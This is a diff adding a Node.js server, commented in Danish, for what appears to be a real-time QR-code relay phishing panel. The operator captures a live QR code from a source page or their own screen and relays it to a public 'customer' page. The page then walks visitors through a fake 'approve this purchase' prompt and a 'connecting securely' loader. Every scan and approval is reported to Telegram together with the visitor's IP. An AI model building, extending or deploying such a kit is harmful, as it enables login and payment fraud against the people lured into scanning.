@@ -1,0 +1,728 @@
+require('dotenv').config();
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const fs = require('fs');
+const path = require('path');
+const { Jimp } = require('jimp');
+const jsQR = require('jsqr');
+
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+
+const DATA_FILE = path.join(__dirname, 'data.json');
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'skift-mig';
+const PORT = process.env.PORT || 3000;
+
+// --- cPanel/Passenger kan køre app'en i flere processer, og hver proces har
+// sin egen kopi af `state` i hukommelsen. data.json er det fælles
+// udgangspunkt, så vi husker filens mtime og genindlæser når en anden proces
+// har skrevet til den. ---
+let stateMtime = null;
+function stateMtimeNow() {
+  try { return fs.statSync(DATA_FILE).mtimeMs; } catch (e) { return null; }
+}
+
+function defaultState() {
+  return {
+    live: false,
+    // flow-sekvensen: 'besked' -> 'scan' -> 'action' (egen tekst: godkend køb osv.) -> 'wait' -> 'approved'
+    flow: 'scan',
+    action: { title: 'Godkend dette køb', amount: '', detail: '' },
+    tekst: '',
+    target: '',
+    title: '',
+    message: '',
+    sessionId: genId(),
+    lastUpdated: null,
+    bg: 'mint',
+    offlineTitle: 'Ingen aktiv session',
+    offlineBody: 'Kom tilbage senere',
+    customers: [],
+    templates: [],
+    stats: { totalScans: 0, scanLog: [] },
+    schedule: { enabled: false, start: null, end: null },
+          capture: { sourceUrl: '', enabled: false, lastCheckedAt: null, lastError: null },
+        rotate: { enabled: false, intervalSeconds: 15, lastRotatedAt: null },
+        telegram: { enabled: false, token: '', chatId: '', lastError: null, lastSentAt: null, sentCount: 0 }
+  };
+}
+
+function genId() {
+  return 'S-' + Math.random().toString(36).slice(2, 7).toUpperCase();
+}
+function genTemplateId() {
+  return 'T-' + Math.random().toString(36).slice(2, 8).toUpperCase();
+}
+
+function loadState() {
+  let raw;
+  try {
+    raw = fs.readFileSync(DATA_FILE, 'utf8');
+  } catch (e) {
+    // filen findes ikke (foerste start) -> opret frisk default og gem
+    const fresh = defaultState();
+    saveState(fresh);
+    return fresh;
+  }
+  try {
+    // strip eventuel UTF-8 BOM, ellers fejler JSON.parse
+    const loaded = JSON.parse(raw.replace(/^\uFEFF/, ''));
+    // merge with defaults so upgrades from older data.json don't crash on missing fields
+    return { ...defaultState(), ...loaded, stats: { ...defaultState().stats, ...(loaded.stats || {}) }, schedule: { ...defaultState().schedule, ...(loaded.schedule || {}) }, capture: { ...defaultState().capture, ...(loaded.capture || {}) }, rotate: { ...defaultState().rotate, ...(loaded.rotate || {}) } };
+  } catch (e) {
+    // ugyldig data.json: behold filen som den er (backup sker ikke her, men
+    // vi OVERSKRIVER den ikke med defaults -- det ville slette al data)
+    console.error('data.json kunne ikke laeses - bruger defaults i hukommelsen, filen røres ikke:', e.message);
+    return defaultState();
+  }
+}
+
+function saveState(state) {
+  // STÆRK BACKEND: atomisk skrivning — skriv til temp-fil og omdøb.
+  // Strømmer/afbrydelser kan ikke efterlade en halv data.json.
+  try {
+    const tmp = DATA_FILE + '.tmp';
+    fs.writeFileSync(tmp, JSON.stringify(state, null, 2));
+    fs.renameSync(tmp, DATA_FILE);
+    stateMtime = stateMtimeNow();
+  } catch (e) {
+    console.error('data.json kunne ikke skrives (beholder gamle data):', e.message);
+  }
+}
+
+let state = loadState();
+stateMtime = stateMtimeNow();
+
+// --- Genindlæs fra disk før hvert HTTP-request, så ændringer skrevet af andre
+// processer altid er synlige (Passenger/cPanel multi-proces). ---
+function refreshStateFromDisk() {
+  try {
+    const m = fs.statSync(DATA_FILE).mtimeMs;
+    if (m !== stateMtime) {
+      stateMtime = m;
+      state = loadState();
+    }
+  } catch (e) { /* data.json findes ikke endnu */ }
+}
+app.use((req, res, next) => { refreshStateFromDisk(); next(); });
+
+app.use(express.json());
+
+// --- No-cache guard for the public display: this is what a kiosk screen sits
+// on for hours/days. Without this, browsers and Render's CDN can serve a
+// stale display.html/display.js/styles.css, which looks exactly like "the
+// screen doesn't update when a customer scans" even though the server side
+// is working correctly. ---
+app.use('/display', (req, res, next) => {
+  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.set('Pragma', 'no-cache');
+  res.set('Expires', '0');
+  next();
+});
+app.get(['/display.js', '/styles.css'], (req, res, next) => {
+  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  next();
+});
+
+app.use('/display', express.static(path.join(__dirname, 'public'), { index: 'display.html', etag: false, lastModified: false }));
+// Kundesiden paa roden (/) og /login — kunden skal ikke skulle huske "/display"
+// Kundesiden: BARE domænet (ingen sti) -> visitor.html direkte.
+// /display virker stadig som alias. /login ogsaa.
+app.get(['/', '/login', '/display', '/visitor'], (req, res) => {
+  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.sendFile(path.join(__dirname, 'public', 'visitor.html'));
+});
+app.get(['/capture', '/capture.js'], (req, res, next) => {
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+    next();
+});
+app.use('/capture', express.static(path.join(__dirname, 'public'), { index: 'capture.html', etag: false, lastModified: false }));
+app.use('/admin', express.static(path.join(__dirname, 'public'), { index: 'admin.html' }));
+app.use(express.static(path.join(__dirname, 'public'), { etag: false, lastModified: false }));
+
+// --- Public: read-only state for the display screen (no auth, no secrets in payload) ---
+app.get('/api/public-state', (req, res) => {
+  res.set('Cache-Control', 'no-store');
+  res.json(publicPayload());
+});
+
+// --- Public: scan-tracking redirect. QR codes point here instead of straight to the target,
+// so every real scan gets counted before the customer is sent on to the actual link. ---
+app.get('/r/:sessionId', (req, res) => {
+  if (state.live && state.target) {
+    state.stats.totalScans += 1;
+    state.stats.scanLog.push({ at: Date.now(), session: req.params.sessionId });
+    if (state.stats.scanLog.length > 200) {
+      state.stats.scanLog = state.stats.scanLog.slice(-200);
+    }
+    saveState(state);
+    io.emit('admin-state-update', safeAdminState());
+    // Telegram: notificér admin om scanningen (med kundens IP)
+    telegramSend(`📲 QR scannet (session ${req.params.sessionId})\nIP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'ukendt'}\nKlokken: ${new Date().toLocaleString('da-DK')}`).catch(() => {});
+    return res.redirect(302, state.target);
+  }
+  res.status(404).send(`
+    <!DOCTYPE html><html lang="da"><head><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>regningoutbounn</title>
+    <style>body{font-family:sans-serif;background:#132E28;color:#DCF2E8;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px;}</style>
+    </head><body><div><h1>Ingen aktiv session</h1><p>Dette link er ikke aktivt lige nu.</p></div></body></html>
+  `);
+});
+
+// --- Admin auth middleware ---
+function requireAdmin(req, res, next) {
+  const auth = req.headers['x-admin-password'];
+  if (auth !== ADMIN_PASSWORD) {
+    return res.status(401).json({ error: 'Forkert adgangskode' });
+  }
+  next();
+}
+
+async function resolveQrImageBuffer(url) {
+    const r = await fetch(url, { redirect: 'follow' });
+    if (!r.ok) throw new Error(`Kunne ikke hente siden (HTTP ${r.status})`);
+    const ct = r.headers.get('content-type') || '';
+    if (ct.startsWith('image/')) {
+          return Buffer.from(await r.arrayBuffer());
+    }
+    const html = await r.text();
+    const imgMatches = [...html.matchAll(/<img[^>]+src=["']([^"']+)["'][^>]*>/gi)];
+    if (!imgMatches.length) throw new Error('Ingen billeder fundet paa siden');
+    const qrCandidate = imgMatches.find(m => /qr/i.test(m[0]));
+    const candidate = qrCandidate || imgMatches[0];
+    let imgSrc = candidate[1];
+    if (imgSrc.startsWith('//')) {
+          imgSrc = 'https:' + imgSrc;
+    } else if (!/^https?:\/\//i.test(imgSrc)) {
+          imgSrc = new URL(imgSrc, url).toString();
+    }
+    const r2 = await fetch(imgSrc, { redirect: 'follow' });
+    if (!r2.ok) throw new Error(`Kunne ikke hente billedet (HTTP ${r2.status})`);
+    return Buffer.from(await r2.arrayBuffer());
+}
+
+async function decodeQrFromBuffer(buffer) {
+    const image = await Jimp.read(buffer);
+    const { data, width, height } = image.bitmap;
+    const code = jsQR(new Uint8ClampedArray(data), width, height);
+    return code ? code.data : null;
+}
+
+app.post('/api/capture-url', requireAdmin, async (req, res) => {
+    const { url } = req.body;
+    if (!url || typeof url !== 'string' || !url.trim()) {
+          return res.status(400).json({ error: 'Ingen URL angivet' });
+    }
+    const cleanUrl = url.trim();
+    try {
+          const buffer = await resolveQrImageBuffer(cleanUrl);
+          const decoded = await decodeQrFromBuffer(buffer);
+          state.capture.lastCheckedAt = Date.now();
+          if (!decoded) {
+                  state.capture.lastError = 'Kunne ikke finde eller aflaese en QR-kode paa siden';
+                  saveState(state);
+                  return res.status(422).json({ error: state.capture.lastError });
+          }
+          state.capture.lastError = null;
+          if (state.target !== decoded || !state.live) {
+                  state.target = decoded;
+                  state.live = true;
+                  state.lastUpdated = Date.now();
+                  io.emit('state-update', publicPayload());
+          }
+          saveState(state);
+          io.emit('admin-state-update', safeAdminState());
+          res.json({ ok: true, target: decoded });
+    } catch (e) {
+          state.capture.lastError = e.message || 'Ukendt fejl';
+          state.capture.lastCheckedAt = Date.now();
+          saveState(state);
+          io.emit('admin-state-update', safeAdminState());
+          res.status(500).json({ error: state.capture.lastError });
+    }
+});
+
+app.post('/api/capture-settings', requireAdmin, (req, res) => {
+    const { sourceUrl, enabled } = req.body;
+    if (sourceUrl !== undefined) state.capture.sourceUrl = String(sourceUrl).trim();
+    if (enabled !== undefined) state.capture.enabled = !!enabled;
+    saveState(state);
+    io.emit('admin-state-update', safeAdminState());
+    res.json(state.capture);
+});
+
+// Push a value read live from the admin's own screen (screen-capture flow):
+// no server-side fetch/decoding needed here, the browser already decoded it.
+app.post('/api/capture-push', requireAdmin, (req, res) => {
+    const { target } = req.body;
+    if (!target || typeof target !== 'string' || !target.trim()) {
+          return res.status(400).json({ error: 'Tom kode' });
+    }
+    const clean = target.trim();
+    const changed = (state.target !== clean || !state.live);
+    state.capture.lastCheckedAt = Date.now();
+    state.capture.lastError = null;
+    if (changed) {
+          state.target = clean;
+          state.live = true;
+          state.lastUpdated = Date.now();
+    }
+    // HURTIGHED: ack straks, kundesiden opdateres via socket i samme tick,
+    // disk-skrivning + Telegram sker asynkront bagefter (blokerer ikke push)
+    res.json({ ok: true, target: clean, live: state.live });
+    if (changed) {
+          io.emit('state-update', publicPayload());
+          telegramSend(`🎯 QR-mål opdateret via skærmdeling:\n${clean.slice(0, 100)}\n(${new Date().toLocaleString('da-DK')})`).catch(() => {});
+    }
+    io.emit('admin-state-update', safeAdminState());
+    saveState(state);
+});
+
+setInterval(async () => {
+    refreshStateFromDisk();
+    if (!state.capture || !state.capture.enabled || !state.capture.sourceUrl) return;
+    try {
+          const buffer = await resolveQrImageBuffer(state.capture.sourceUrl);
+          const decoded = await decodeQrFromBuffer(buffer);
+          state.capture.lastCheckedAt = Date.now();
+          if (!decoded) {
+                  state.capture.lastError = 'Kunne ikke finde eller aflaese en QR-kode paa siden';
+                  saveState(state);
+                  io.emit('admin-state-update', safeAdminState());
+                  return;
+          }
+          state.capture.lastError = null;
+          if (state.target !== decoded || !state.live) {
+                  state.target = decoded;
+                  state.live = true;
+                  state.lastUpdated = Date.now();
+                  saveState(state);
+                  io.emit('state-update', publicPayload());
+                  io.emit('admin-state-update', safeAdminState());
+          } else {
+                  saveState(state);
+          }
+    } catch (e) {
+          state.capture.lastError = e.message || 'Ukendt fejl';
+          state.capture.lastCheckedAt = Date.now();
+          saveState(state);
+          io.emit('admin-state-update', safeAdminState());
+    }
+}, 20000);
+
+// --- Login med Telegram-2FA ---
+// Trin 1: korrekt adgangskode -> generér 6-cifret kode, send til Telegram-bot,
+//         og krav koden før adgang gives (fald tilbage til kun adgangskode hvis
+//         Telegram ikke er konfigureret).
+const crypto = require('crypto');
+
+app.post('/api/login', (req, res) => {
+  const ip = clientIp(req);
+  if (loginRateLimited(ip)) {
+    return res.status(429).json({ ok: false, error: 'For mange forsøg — prøv igen om få minutter' });
+  }
+  const { password } = req.body;
+  if (password !== ADMIN_PASSWORD) {
+    loginRateCount(ip);
+    return res.status(401).json({ ok: false });
+  }
+  loginRateReset(ip);
+  // er Telegram klar?
+  const tg = state.telegram || {};
+  const tgReady = tg.enabled && tg.token && tg.chatId;
+  if (!tgReady) {
+    return res.json({ ok: true, needsCode: false });
+  }
+  // generér kode (6 cifre), gyldig 5 min
+  const code = String(crypto.randomInt(100000, 999999));
+  state.loginCode = { code, expiresAt: Date.now() + 5 * 60 * 1000, attempts: 0 };
+  saveState(state);
+  telegramSend(`🔐 TheDevs Admin Panel\nLogin-kode: ${code}\n(Gyldig i 5 minutter — ${
+    new Date().toLocaleTimeString('da-DK')})`).catch(() => {});
+  res.json({ ok: true, needsCode: true });
+});
+
+// Trin 2: verificér koden fra Telegram
+app.post('/api/login/verify', (req, res) => {
+  const ip = clientIp(req);
+  if (loginRateLimited(ip)) {
+    return res.status(429).json({ ok: false, error: 'For mange forsøg — prøv igen om få minutter' });
+  }
+  const { password, code } = req.body;
+  if (password !== ADMIN_PASSWORD) {
+    loginRateCount(ip);
+    return res.status(401).json({ ok: false, error: 'Forkert adgangskode' });
+  }
+  const lc = state.loginCode;
+  if (!lc || !lc.code) {
+    return res.status(400).json({ ok: false, error: 'Ingen kode sendt — log ind igen' });
+  }
+  if (Date.now() > lc.expiresAt) {
+    state.loginCode = null;
+    saveState(state);
+    return res.status(400).json({ ok: false, error: 'Koden er udløbet — log ind igen' });
+  }
+  if ((lc.attempts || 0) >= 5) {
+    state.loginCode = null;
+    saveState(state);
+    return res.status(429).json({ ok: false, error: 'For mange forsøg — log ind igen' });
+  }
+  if (String(code || '').trim() !== lc.code) {
+    lc.attempts = (lc.attempts || 0) + 1;
+    loginRateCount(ip);
+    saveState(state);
+    return res.status(401).json({ ok: false, error: 'Forkert kode' });
+  }
+  // korrekt kode — ryd den og nulstil rate-limit
+  state.loginCode = null;
+  loginRateReset(ip);
+  saveState(state);
+  res.json({ ok: true });
+});
+
+// --- Telegram-notifikationer ---
+// Token+chatId lever KUN paa serveren: gemmes i data.json men strippes i
+// alle API-svar og broadcasts, så de aldrig rammer en browser/klient.
+async function telegramSend(text) {
+  const t = state.telegram;
+  if (!t || !t.enabled || !t.token || !t.chatId) return;
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: t.chatId, text })
+    });
+    t.lastError = r.ok ? null : `HTTP ${r.status}`;
+    t.lastSentAt = Date.now();
+    if (r.ok) t.sentCount = (t.sentCount || 0) + 1;
+  } catch (e) {
+    t.lastError = e.message || 'Netværksfejl';
+  }
+}
+
+// state uden hemmeligheder (til /api/state og admin-broadcast)
+function safeAdminState() {
+  const { telegram, ...rest } = state;
+  return {
+    ...rest,
+    telegram: telegram
+      ? { enabled: telegram.enabled, hasToken: !!telegram.token, hasChatId: !!telegram.chatId, lastError: telegram.lastError, lastSentAt: telegram.lastSentAt, sentCount: telegram.sentCount || 0 }
+      : { enabled: false }
+  };
+}
+
+app.post('/api/telegram-settings', requireAdmin, (req, res) => {
+  const { enabled, token, chatId } = req.body;
+  if (enabled !== undefined) state.telegram.enabled = !!enabled;
+  if (token !== undefined) state.telegram.token = String(token).trim();
+  if (chatId !== undefined) state.telegram.chatId = String(chatId).trim();
+  saveState(state);
+  io.emit('admin-state-update', safeAdminState());
+  res.json(safeAdminState().telegram);
+});
+
+app.post('/api/telegram-test', requireAdmin, async (req, res) => {
+  state.telegram.lastError = null;
+  await telegramSend('✅ QR-panel: Test-besked — Telegram-integrationen virker!');
+  saveState(state);
+  res.json(safeAdminState().telegram);
+});
+
+app.get('/api/state', requireAdmin, (req, res) => {
+  res.json(safeAdminState());
+});
+
+app.post('/api/state', requireAdmin, (req, res) => {
+  const allowed = ['live', 'flow', 'target', 'title', 'message', 'bg', 'offlineTitle', 'offlineBody'];
+  allowed.forEach(key => {
+    if (req.body[key] !== undefined) state[key] = req.body[key];
+  });
+  state.lastUpdated = Date.now();
+  saveState(state);
+  io.emit('state-update', publicPayload());
+  io.emit('admin-state-update', safeAdminState());
+  res.json(safeAdminState());
+});
+
+app.post('/api/session/new', requireAdmin, (req, res) => {
+  state.sessionId = genId();
+  state.lastUpdated = Date.now();
+  saveState(state);
+  io.emit('admin-state-update', safeAdminState());
+  io.emit('state-update', publicPayload());
+  res.json(safeAdminState());
+});
+
+// --- Flow: kundens trin på /display — 'besked' | 'scan' | 'action' | 'wait' | 'approved' ---
+// Styrles fra admin-konsollens kontrol-knapper. 'approved' sender
+// Telegram-besked ("Kunde er nu Godkendt!") som i det gamle panel.
+app.post('/api/flow', requireAdmin, (req, res) => {
+  const flow = req.body.flow;
+  if (!['besked', 'scan', 'wait', 'approved', 'action', 'tekst'].includes(flow)) {
+    return res.status(400).json({ error: 'Ugyldigt flow' });
+  }
+  state.flow = flow;
+  // action-trin: medsend evt. ny tekst/beløb/detalje
+  if (flow === 'action' && req.body.action) {
+    const a = req.body.action;
+    state.action = state.action || {};
+    if (a.title  !== undefined) state.action.title  = String(a.title).slice(0, 200);
+    if (a.amount !== undefined) state.action.amount = String(a.amount).slice(0, 50);
+    if (a.detail !== undefined) state.action.detail = String(a.detail).slice(0, 400);
+  }
+  // tekst-trin: admin skriver en fritekst der vises til kunden
+  if (flow === 'tekst' && req.body.tekst !== undefined) {
+    state.tekst = String(req.body.tekst).slice(0, 500);
+  }
+  state.lastUpdated = Date.now();
+  saveState(state);
+  // øjeblikkelig push til kundesiden (socket) + admin
+  io.emit('state-update', publicPayload());
+  io.emit('admin-state-update', safeAdminState());
+  if (flow === 'approved') {
+    telegramSend('✅ Kunde er nu Godkendt!').catch(() => {});
+  }
+  res.json(safeAdminState());
+});
+
+// --- Kunden har trykket GODKEND/ANNULLER på action-trinnet ---
+app.post('/api/action-response', (req, res) => {
+  const r = req.body.response; // 'ok' | 'cancel'
+  if (!['ok', 'cancel'].includes(r)) {
+    return res.status(400).json({ error: 'Ugyldigt svar' });
+  }
+  const a = state.action || {};
+  const label = r === 'ok' ? '✅ GODKENDT' : '❌ ANNULLERET';
+  const amount = a.amount ? ` — ${a.amount}` : '';
+  telegramSend(`${label} af kunden\n${a.title || 'Handling'}${amount}\n${a.detail || ''}\n(${new Date().toLocaleString('da-DK')})`).catch(() => {});
+  state.actionResponse = { at: Date.now(), response: r };
+  if (r === 'ok') {
+    // kunden godkendte -> den klassiske "Forbinder sikkert"-loader
+    state.flow = 'wait';
+  }
+  saveState(state);
+  io.emit('state-update', publicPayload());
+  io.emit('admin-state-update', safeAdminState());
+  res.json({ ok: true });
+});
+
+app.post('/api/customers', requireAdmin, (req, res) => {
+  const ref = 'K-' + Math.floor(1000 + Math.random() * 9000);
+  state.customers.push({
+    ref,
+    session: state.sessionId,
+    started: Date.now(),
+    status: 'active'
+  });
+  saveState(state);
+  io.emit('admin-state-update', safeAdminState());
+  res.json(safeAdminState());
+});
+
+// --- Templates: save & reuse a full session setup (title, message, target, bg) ---
+app.get('/api/templates', requireAdmin, (req, res) => {
+  res.json(state.templates);
+});
+
+app.post('/api/templates', requireAdmin, (req, res) => {
+  const { name, title, message, target, bg } = req.body;
+  if (!name || !name.trim()) {
+    return res.status(400).json({ error: 'Skabelonen skal have et navn' });
+  }
+  const template = {
+    id: genTemplateId(),
+    name: name.trim(),
+    title: title || '',
+    message: message || '',
+    target: target || '',
+    bg: bg || 'mint',
+    createdAt: Date.now()
+  };
+  state.templates.push(template);
+  saveState(state);
+  io.emit('admin-state-update', safeAdminState());
+  res.json(template);
+});
+
+app.post('/api/templates/:id/apply', requireAdmin, (req, res) => {
+  const tpl = state.templates.find(t => t.id === req.params.id);
+  if (!tpl) return res.status(404).json({ error: 'Skabelon ikke fundet' });
+  state.title = tpl.title;
+  state.message = tpl.message;
+  state.target = tpl.target;
+  state.bg = tpl.bg;
+  state.lastUpdated = Date.now();
+  saveState(state);
+  io.emit('state-update', publicPayload());
+  io.emit('admin-state-update', safeAdminState());
+  res.json(safeAdminState());
+});
+
+app.delete('/api/templates/:id', requireAdmin, (req, res) => {
+  state.templates = state.templates.filter(t => t.id !== req.params.id);
+  saveState(state);
+  io.emit('admin-state-update', safeAdminState());
+  res.json({ ok: true });
+});
+
+// --- Stats ---
+app.get('/api/stats', requireAdmin, (req, res) => {
+  const dayMs = 24 * 60 * 60 * 1000;
+  const now = Date.now();
+  const last24h = state.stats.scanLog.filter(s => now - s.at < dayMs).length;
+  res.json({
+    totalScans: state.stats.totalScans,
+    last24h,
+    recent: state.stats.scanLog.slice(-15).reverse()
+  });
+});
+
+// --- Scheduling: auto go live/offline within a time window, checked every 30s ---
+app.post('/api/schedule', requireAdmin, (req, res) => {
+  const { enabled, start, end } = req.body;
+  state.schedule = {
+    enabled: !!enabled,
+    start: start || null,
+    end: end || null
+  };
+  saveState(state);
+  io.emit('admin-state-update', safeAdminState());
+  res.json(state.schedule);
+});
+
+setInterval(() => {
+  refreshStateFromDisk();
+  if (!state.schedule || !state.schedule.enabled || !state.schedule.start || !state.schedule.end) return;
+  const now = Date.now();
+  const start = new Date(state.schedule.start).getTime();
+  const end = new Date(state.schedule.end).getTime();
+  if (isNaN(start) || isNaN(end)) return;
+  const shouldBeLive = now >= start && now <= end;
+  if (shouldBeLive !== state.live) {
+    state.live = shouldBeLive;
+    state.lastUpdated = Date.now();
+    saveState(state);
+    io.emit('state-update', publicPayload());
+    io.emit('admin-state-update', safeAdminState());
+  }
+}, 30000);
+
+function publicPayload() {
+  const a = state.action || {};
+  return {
+    live: state.live,
+    flow: state.flow || 'scan',
+    target: state.target,
+    sessionId: state.sessionId,
+    title: state.title,
+    message: state.message,
+    action: { title: a.title || 'Godkend dette køb', amount: a.amount || '', detail: a.detail || '' },
+    tekst: state.tekst || '',
+    offlineTitle: state.offlineTitle,
+    offlineBody: state.offlineBody
+  };
+}
+
+// ════════════════════════════════════════════════════════════
+// STÆRK BACKEND — robusthed så app'en ikke går ned:
+// 1) Ingen route-fejl kan crashe processen
+// 2) Rate-limit på login (brute-force-beskyttelse)
+// 3) Ufangede promise-fejl logges i stedet for at dræbe processen
+// 4) Disk-fejl under skrivning mister aldrig data i hukommelsen
+// ════════════════════════════════════════════════════════════
+
+// global fejlhåndtering: log og koer videre
+process.on('uncaughtException', (err) => {
+  console.error('[crash-guard] uncaughtException:', err.message, err.stack ? err.stack.split('\n')[1] : '');
+});
+process.on('unhandledRejection', (reason) => {
+  console.error('[crash-guard] unhandledRejection:', reason && reason.message ? reason.message : reason);
+});
+
+// rate-limit: login (og 2FA-verificering) — max 10 forsøg pr. 10 min pr. IP
+const loginAttempts = new Map(); // ip -> { count, firstAt }
+const LOGIN_WINDOW_MS = 10 * 60 * 1000;
+const LOGIN_MAX = 10;
+
+function loginRateLimited(ip) {
+  const now = Date.now();
+  let a = loginAttempts.get(ip);
+  if (!a || now - a.firstAt > LOGIN_WINDOW_MS) {
+    a = { count: 0, firstAt: now };
+    loginAttempts.set(ip, a);
+  }
+  return a.count >= LOGIN_MAX;
+}
+function loginRateCount(ip) {
+  const a = loginAttempts.get(ip);
+  if (a) a.count += 1;
+}
+function loginRateReset(ip) {
+  loginAttempts.delete(ip);
+}
+
+function clientIp(req) {
+  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '?';
+}
+
+io.on('connection', (socket) => {
+  socket.emit('state-update', publicPayload());
+});
+
+// Pas på: på cPanel/Passenger skal denne app IKKE lægge om til et fast portnr
+// eller '0.0.0.0' — Passenger selv styrer forbindelsen, og listen-kaldet her
+// fungerer som det er (PORT bruges kun ved lokal test).
+server.listen(PORT, () => {
+  console.log(`QR-panel kører på http://localhost:${PORT}`);
+  console.log(`Admin: http://localhost:${PORT}/admin`);
+  console.log(`Skærm: http://localhost:${PORT}/display`);
+});
+
+
+// --- Rotation: automatically generate a new sessionId every N seconds, so the
+// QR code visually changes on its own. This is entirely our own session token
+// (not tied to any bank or ID provider) -- it just makes an old screenshot of
+// the code stop matching what's shown moments later. ---
+app.post('/api/rotate-settings', requireAdmin, (req, res) => {
+    const { enabled, intervalSeconds } = req.body;
+    if (enabled !== undefined) state.rotate.enabled = !!enabled;
+    if (intervalSeconds !== undefined) {
+          const n = parseInt(intervalSeconds, 10);
+          if (Number.isFinite(n) && n >= 1) state.rotate.intervalSeconds = n;
+    }
+    state.rotate.lastRotatedAt = Date.now();
+    saveState(state);
+    io.emit('admin-state-update', safeAdminState());
+    res.json(state.rotate);
+});
+
+setInterval(() => {
+    refreshStateFromDisk();
+    if (!state.rotate || !state.rotate.enabled) return;
+    const now = Date.now();
+    const last = state.rotate.lastRotatedAt || 0;
+    const intervalMs = (state.rotate.intervalSeconds || 15) * 1000;
+    if (now - last >= intervalMs) {
+          state.sessionId = genId();
+          state.rotate.lastRotatedAt = now;
+          state.lastUpdated = now;
+          saveState(state);
+          io.emit('state-update', publicPayload());
+          io.emit('admin-state-update', safeAdminState());
+          telegramSend(`🔄 QR-rotation: ny session ${state.sessionId} (${now.toLocaleString('da-DK')})`).catch(() => {});
+    }
+}, 1000);
+
+// 404-handler + global express-fejl-handler — ALLERSIDST i filen,
+// efter alle endpoints (fx /api/rotate-settings), så intet bliver slugt
+app.use((req, res) => {
+  res.status(404).json({ error: 'Ikke fundet' });
+});
+app.use((err, req, res, next) => {
+  console.error('[express-fejl]', req.method, req.path, err.message);
+  if (res.headersSent) return next(err);
+  res.status(500).json({ error: 'Intern fejl' });
+});
